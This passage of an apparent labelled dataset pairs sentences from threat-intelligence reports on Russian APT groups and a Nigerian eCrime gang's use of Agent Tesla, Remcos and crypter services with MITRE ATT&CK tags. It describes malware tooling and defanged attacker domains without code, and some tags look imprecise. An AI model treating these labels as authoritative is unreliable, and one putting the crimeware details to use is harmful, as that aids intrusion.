detected a new malware, which we dubbed BlackSoul](https://quointelligence.eu/2021/01/reconhellcat-uses-nist-theme-as-lure-to-deliver-new-blacksoul-malware/).", "labels": [], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "It shared multiple similarities with ReconHellcat.", "labels": [], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "In addition,\u00a0ReconHellcat\u00a0shares\u00a0similarities\u00a0with [APT28.](#apt28)", "labels": ["G0007"], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "### APT28", "labels": ["G0007"], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "Active since at least 2007, APT28 primarily targets government, military, and security organizations globally.", "labels": ["G0007"], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "Researchers have linked APT28 activity to Russia\u2019s General Staff Main Intelligence Directorate (GRU) and 85th Main Special Service Center (GTsSS).", "labels": ["G0007", "G0007"], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "In August 2020, we detected an ongoing APT28 campaign, which revealed correlations with a ReconHell/BlackWater attack.", "labels": ["G0007"], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "[APT28 delivered the\u00a0Zebrocy\u00a0malware](https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/) in the campaign and used an upcoming NATO training as a lure.", "labels": ["G0007"], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "### Turla", "labels": ["G0010"], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "Active since at least 2004, Turla targets government, military, technology, and energy sectors.", "labels": ["G0010"], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "Turla has also targeted foreign embassies as well as commercial organizations to conduct espionage campaigns.", "labels": ["G0010"], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "### Xenotime", "labels": [], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "The group has used TRITON malware to manipulate industrial safety systems.", "labels": [], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "### Gamaredon", "labels": ["G0047"], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "### Berserk Bear", "labels": [], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "Berserk Bear has targeted organizations in the US and Germany\u2019s energy, utilities, and telecommunications sectors.", "labels": [], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "### Sandworm Team", "labels": ["G0034"], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "While each APT resorts to different TTPs, they share similarities, such as being highly stealthy and achieving persistence in the targeted networks.", "labels": ["TA0003"], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "In the recent advisory, the US government warned of exploitation activity of publicly known vulnerabilities, including in Fortinet and Pulse Secure VPNs.", "labels": ["T1190"], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "For instance, if an attacker hijacks a cookie, they could impersonate an individual to gain unauthorized access to information or services.", "labels": ["T1606", "T1134"], "document": "quoteintelligence_2021-05-20_how-the-demise-of-third"}, {"sentence": "A way to do that is by injecting Cross-site Scripting (XSS) payloads on a web application.", "labels": ["T1189"], "document": "quoteintelligence_2021-05-20_how-the-demise-of-third"}, {"sentence": "Thereby, the malicious script can steal the user\u2019s cookie and send it to the attacker.", "labels": ["T1539"], "document": "quoteintelligence_2021-05-20_how-the-demise-of-third"}, {"sentence": "Certain\u00a0malware installed in the victim\u2019s device\u00a0can also target cookies and transfer them to the attacker\u2019s server, who can later use the data contained within to log in to the victim\u2019s account for personal gain.", "labels": ["T1539"], "document": "quoteintelligence_2021-05-20_how-the-demise-of-third"}, {"sentence": "However, security risks are not limited to websites visited by the user or malware downloaded.", "labels": ["T1189"], "document": "quoteintelligence_2021-05-20_how-the-demise-of-third"}, {"sentence": "The data gathered by cookies travels across the internet. From there, ad and analytics services are buying and selling it while putting users\u2019 data at risk of data breaches.", "labels": ["T1539"], "document": "quoteintelligence_2021-05-20_how-the-demise-of-third"}, {"sentence": "All these changes could also result in [attackers developing new ways](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/) to access personally identifiable data online.", "labels": ["T1589"], "document": "quoteintelligence_2021-05-20_how-the-demise-of-third"}, {"sentence": "E.K.P. & Agent Tesla: The Daily Operations of a Nigerian eCrime Gang", "labels": ["S0331"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "In late 2020, QuoIntelligence identified a malicious Word document.", "labels": ["T1566"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "The Word document contained technical indicators associated with an Agent Tesla malware campaign, a readily available Remote Access Trojan (RAT) that steals keystrokes and credentials.", "labels": ["S0331", "TA0006", "T1566", "T1056"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Based on our investigation, we dubbed the eCrime gang \u201cE.K.P.\u201d.", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "We also learned that E.K.P is an operator within a service model known as Malware-as-a-Service (MaaS).", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "MaaS & RaaS: The All Skill-Level eCrime Conductors", "labels": ["T1486"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Cybercriminals are increasingly adopting MaaS for conventional malware campaigns and ransomware deployments (Ransomware-as-a-Service or short\u202fRaaS).", "labels": ["T1486", "T1486"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "In this report, we highlight the daily operations of E.K.P and the various commodity tools used to both stage and execute attack campaigns.", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Uncovering E.K.P", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Apparently a user from a VirusTotal in the Netherlands\u202fcontaining a weaponized macro uploaded it.", "labels": ["T1059"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "If the cyber attacker can successfully convince their target to open the document, the kill-chain will be launched, and the malware will be able to steal the information of the person who opened the file.", "labels": ["T1566", "TA0010"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[![Malicious Word document that E.K.P. used as attack lure](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Malicious Word document that E.K.P. used as attack lure\")", "labels": ["T1566"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "![Malicious Word document that E.K.P. used as attack lure](https://quointelligence.eu/wp-content/uploads/2021/06/image1.jpg \"Malicious Word document that E.K.P. used as attack lure\")](https://quointelligence.eu/wp-content/uploads/2021/06/image1.jpg \"Malicious Word document that E.K.P. used as attack lure\")", "labels": ["T1566", "T1566"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[![Description and display of lure document](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Description and display of lure document\")![Description and display of lure document](https://quointelligence.eu/wp-content/uploads/2021/06/image2-300x113.jpg \"Description and display of lure document\")](https://quointelligence.eu/wp-content/uploads/2021/06/image2-300x113.jpg \"Description and display of lure document\")", "labels": ["T1566", "T1566", "T1566", "T1566"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "##### Word document titled *Azerbaijan-Turkey Military Negotiations.doc* that E.K.P. used as lure for their recent attack", "labels": ["T1566"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "E.K.P. Kill-Chain and Tesla Agent\u2019s Connections to Other Malware Families", "labels": ["S0331"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "The macro embedded with the Word document obfuscates, i.e., creates difficult-to-read code, to another simple obfuscated script.", "labels": ["T1027", "T1059", "T1027"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "This script then tries to download and execute a payload retrieved from a Command and Control (C2) URL.", "labels": ["TA0011", "T1105"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "However, we determined additional files associated with the same C2 URL: a widespread malware family known as\u202f*Agent Tesla*.", "labels": ["TA0011", "S0331", "T1105"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Agent Tesla is a readily available keylogger and Remote Access Trojan (RAT), written in .NET.", "labels": ["S0331", "T1056"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Its primary function includes logging keystrokes and the clipboard to exfiltrate data ultimately.", "labels": ["T1056", "T1115", "TA0010"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "At least this specific variant attempts to exfiltrate data from the victim using hardcoded Simple Mail Transfer Protocol (SMTP) credentials for an attacker-controlled mailbox.", "labels": ["TA0010", "T1048"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Another malware family tied to the C2 Infrastructure is \u201cRemcos RAT,\u201d giving a cybercriminal complete control of an infected system.", "labels": ["TA0011", "S0332"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Its capabilities include keylogging and surveillance through audio and screenshots.", "labels": ["T1056", "T1113"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Sir Pee and Day to Day Operations at eCrime gang E.K.P.", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Based on what we have learned so far, we dubbed the cybercriminal gang E.K.P, and we understand that they are located in Nigeria.", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "E.K.P. starts the day by communicating with customers and its management to determine the needed actions for the day.", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "![E.K.P.'s communication thread between group members, managers, and clients](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"E.K.P.'s communication thread\")![E.K.P.'s communication thread between group members, managers, and clients](https://quointelligence.eu/wp-content/uploads/2021/06/image3-1024x576.jpg \"E.K.P.'s communication thread\")", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "##### Screenshot of the conversation thread between E.K.P. members, their managers, and clients", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Based on other conversation threads, the contact with the moniker\u202fSir Pee\u202fappears to be the manager of E.K.P.", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "As you can see in the screenshot above, Sir Pee instructs E.K.P to \u201cspam zip file now\u201d and then sends the link to where the malicious file is uploaded.", "labels": ["T1566", "T1566"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "E.K.P responds with login credentials for an email account to the domain\u202f*loanabank[.]com*.", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Sir Pee, in turn, sends E.K.P credentials for a CPanel \u2013 a control dashboard to facilitate the management of a web hosting server.", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[![Homepage of Ioanabank[.]com - a fake bank domain E.K.P. is using](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Screenshot of homepage of Ioanabank[.]com\")", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "![Homepage of Ioanabank[.]com - a fake bank domain E.K.P. is using](https://quointelligence.eu/wp-content/uploads/2021/06/image4.jpg \"Screenshot of homepage of Ioanabank[.]com\")](https://quointelligence.eu/wp-content/uploads/2021/06/image4.jpg \"Homepage of Ioanabank[.]com - a fake bank domain E.K.P. is using\")", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "E.K.P.\u2019s multi-functional, multi-vendor attacker toolset", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Our observations indicate clearly that E.K.P uses various malware builder kits, services, and inboxes for conducting their operations.", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "After starting the day checking in with the apparent manager, E.K.P begins with their operational rounds by accessing their web shell on\u202f*predilletastore[.]com[.]br.*", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "E.K.P. uses this for attack operations and to control compromised hosts remotely.", "labels": ["TA0011"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[![E.K.P.'s web shell on predilletastore[.]com[.]br](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Screenshot of E.K.P.'s web shell on predilletastore[.]com[.]br\")![E.K.P.'s web shell on predilletastore[.]com[.]br](https://quointelligence.eu/wp-content/uploads/2021/06/image5-1024x561.jpg \"Screenshot of E.K.P.'s web shell on predilletastore[.]com[.]br\")](https://quointelligence.eu/wp-content/uploads/2021/06/image5-1024x561.jpg \"E.K.P.'s web shell on predilletastore[.]com[.]br\")", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "##### Screenshot of predilletastore[.]com[.]br \u2013 E.K.P. web shell", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Based on their contact list, E.K.P seems to have access to a wide range of tools, especially if a potential customer requires capabilities outside the gang\u2019s service catalog.", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "However, during our observations, E.K.P heavily relied on mainly three core malware builder kits.", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "### Exploit Builder (version 1.5.0.1):", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Exploit Builder enables E.K.P to create an exploit document (e.g., Microsoft Word or Excel) that delivers a malware payload to a victim host.", "labels": ["T1059"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "At first, the gang creates a payload using Origin Logger.", "labels": ["S0331"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Secondly, they obfuscate the payload with the Cassandra Crypter service.", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "### Origin Logger (also known as\u202fAgent Tesla):", "labels": ["S0331", "S0331"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "\u202fThrough our analysis, we confirm that the payload generated by Origin Logger is nearly the same as previously decoded Agent Tesla payloads.", "labels": ["S0331", "S0331"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "The C2 panel interface matches the same panel that threat actors use for the malware Origin Logger, bundled with the C2 panel, and then sold to attackers.", "labels": ["TA0011", "S0331", "TA0011"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "As the name suggests, its primary purpose is logging keystrokes, clipboard data, HTTP cookies, taking periodic screenshots, and viewing the webcam of infected computers.", "labels": ["T1056", "T1115", "T1113", "T1606"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "![Screenshots showing Exploit Builder and Origin Logger](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Screenshots showing Exploit Builder and Origin Logger\")", "labels": ["S0331", "S0331"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "![Screenshots showing Exploit Builder and Origin Logger](https://quointelligence.eu/wp-content/uploads/2021/06/image6-1024x561.jpg \"Screenshots showing Exploit Builder and Origin Logger\")", "labels": ["S0331", "S0331"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "##### Screenshots showing Exploit Builder and Origin Logger", "labels": ["S0331"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "E.K.P leveraged the Origin Logger builder to create multiple variants to infect victims.", "labels": ["S0331"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "For obfuscation of the payloads, the threat actor used the online service known as\u202fCassandra Crypter.", "labels": ["T1027"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "### Cassandra Crypter Service:", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Based on their website, Cassandra Crypter Service describes itself as:", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "The customized obfuscation (e.g., ConfuserEx) of the .NET Agent Tesla payloads offered through Cassandra Crypter is available through two subscription plans: The Premium or VIP Plan.", "labels": ["S0331", "T1027"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[![Screenshot of Cassandra Crypter Service ](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Screenshot of Cassandra Crypter Service \")", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "![Screenshot of Cassandra Crypter Service ](https://quointelligence.eu/wp-content/uploads/2021/06/image7-1024x815.jpg \"Screenshot of Cassandra Crypter Service \")](https://quointelligence.eu/wp-content/uploads/2021/06/image7-1024x815.jpg \"Screenshot of Cassandra Crypter Service \")", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[![Screenshot of Cassandra Crypter Service Plan & Pricing](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Screenshot of Cassandra Crypter Service Plan & Pricing\")", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "![Screenshot of Cassandra Crypter Service Plan & Pricing](https://quointelligence.eu/wp-content/uploads/2021/06/image8.jpg \"Screenshot of Cassandra Crypter Service Plan & Pricing\")](https://quointelligence.eu/wp-content/uploads/2021/06/image8.jpg \"Screenshot of Cassandra Crypter Service Plan & Pricing\")", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "##### Screenshots of the Cassandra Crypter Dashboard and the service\u2019s pricing plans", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "While E.K.P expedites the time spent preparing malware variants and malicious documents for the attack campaigns using different tools, they eventually get to the distribution part.", "labels": ["T1059"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "E.K.P communicates with multiple contacts throughout the day and even uses *Sendspace*\u202f\u2013 a free hosting site for instant file transfers \u2013 to receive and transfer documents for campaigns.", "labels": ["T1608"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[![Screenshots Turbomailer \u2013 both used by the Nigerian eCrime gang E.K.P.](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Screenshots Turbomailer \u2013 used by the Nigerian eCrime gang E.K.P.\")![Screenshots Turbomailer \u2013 both used by the Nigerian eCrime gang E.K.P.](https://quointelligence.eu/wp-content/uploads/2021/06/image10.jpg \"Screenshots Turbomailer \u2013 used by the Nigerian eCrime gang E.K.P.\")](https://quointelligence.eu/wp-content/uploads/2021/06/image10.jpg \"Screenshots Turbomailer \u2013 both used by the Nigerian eCrime gang E.K.P.", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "##### Screenshots of Sendspace and Turbomailer \u2013 both used by the Nigerian eCrime gang E.K.P.", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Another tool that E.K.P frequently uses for mass emails is the\u202f*Xleet\u00a0Phishing Service*, a service popular amongst threat actors to distribute spear-phishing emails throughout various attacks.", "labels": ["T1566"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "QuoIntelligence\u00a0recently analyzed campaigns attributed to [top-tier threat actor \u201cCobalt\u201d group](https://quointelligence.eu/2020/07/golden-chickens-evolution-of-the-maas/), using a PHP-mailer script placed on a likely compromised server used to distribute spear-phishing emails.", "labels": ["T1566"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "A similar, slightly more complex\u00a0MaaS\u00a0often used by APTs is the Golden Chickens (GC)\u00a0MaaS.", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Since 2018, QuoIntelligence has tracked and highlighted the \u202f[evolution of the Golden Chickens (GC)](https://quointelligence.eu/2020/07/golden-chickens-evolution-of-the-maas/) MaaS\u202fand how different actors use it, including top-tier threat actors FIN6, Cobalt, and\u00a0Evilnum.", "labels": ["G0037", "G0080", "G0120"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "By 2019, we uncovered\u00a0[eleven\u00a0tools attributed to the GC MaaS](https://quointelligence.eu/2021/04/golden-chickens-compilation/)and each customized per campaign for the threat actor purchasing the service.", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "The services offered can include both C2 infrastructure and malware variants.", "labels": ["TA0011"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "E.K.P.: A Highly Active MaaS Provider Supporting Multiple Campaigns Simultaneously", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "Our investigation uncovered E.K.P\u2019s day-to-day operation over a couple of months.", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "QuoIntelligence\u00a0will continue to observe threat actors like E.K.P, which are operating non-complex but effective\u00a0eCrime\u00a0services.", "labels": [], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "**Malicious document (maldoc)**", "labels": ["T1059"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "**Maldoc C2**", "labels": ["TA0011"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "**AgentTesla (delivered by maldoc)**", "labels": ["S0331"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "**REMCOS RAT packed**", "labels": ["S0332"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "**REMCOS RAT upacked**", "labels": ["S0332"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "**REMCOS RAT C2**", "labels": ["S0332", "TA0011"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "| **Initial Access** | [T1566.001: Phishing: Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) |", "labels": ["TA0001", "T1566"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "| **Execution** | [T1203: Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203)", "labels": ["TA0002", "T1203"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1053.005: Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005)", "labels": ["T1053"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1047: Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)", "labels": ["T1047"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1204.002: User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002) |", "labels": ["T1204"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "| **Persistance** | [T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001)", "labels": ["TA0003", "T1547"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1053.005: Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005) |", "labels": ["T1053", "T1053"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "| **Privilege Escalation** | [T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001)", "labels": ["TA0004", "T1547"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1055.012: Process Injection: Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)", "labels": ["T1055", "T1055"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "| **Defense Evasion** | [T1140: Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)", "labels": ["TA0005", "T1140"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1564.001: Hide Artifacts: Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001)", "labels": ["T1564"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1564.003: Hide Artifacts: Hidden Window](https://attack.mitre.org/techniques/T1564/003)", "labels": ["T1564"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1562.001: Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)", "labels": ["T1562"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1112: Modify Registry](https://attack.mitre.org/techniques/T1112)", "labels": ["T1112"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1027: Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)", "labels": ["T1027"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1218.009: Signed Binary Proxy Execution: Regsvcs/Regasm](https://attack.mitre.org/techniques/T1218/009)", "labels": ["T1218"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1497: Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) |", "labels": ["T1497", "T1497"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "| **Credential Access** | [T1555: Credentials from Password Stores](https://attack.mitre.org/techniques/T1555)", "labels": ["T1555"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1555.003: Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003)", "labels": ["T1555"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1056.001: Input Capture: Keylogging](https://attack.mitre.org/techniques/T1056/001)", "labels": ["T1056", "T1056"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1552.001: Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001)", "labels": ["T1552"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1552.002: Unsecured Credentials: Credentials in Registry](https://attack.mitre.org/techniques/T1552/002) |", "labels": ["T1552"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "| **Discovery** | [T1087.001: Account Discovery: Local Account](https://attack.mitre.org/techniques/T1087/001)", "labels": ["T1087"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1082: System Information Discovery](https://attack.mitre.org/techniques/T1082)", "labels": ["T1082"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1016: System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016)", "labels": ["T1016"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1033: System Owner/User Discovery](https://attack.mitre.org/techniques/T1033)", "labels": ["T1033"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1124: System Time Discovery](https://attack.mitre.org/techniques/T1124)", "labels": ["T1124"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1057: Process Discovery](https://attack.mitre.org/techniques/T1057)", "labels": ["T1057"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "| **Collection** | [T1560: Archive Collected Data](https://attack.mitre.org/techniques/T1560)", "labels": ["T1560"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1115: Clipboard Data](https://attack.mitre.org/techniques/T1115)", "labels": ["T1115"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1185: Man in the Browser](https://attack.mitre.org/techniques/T1185)", "labels": ["T1185"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1113: Screen 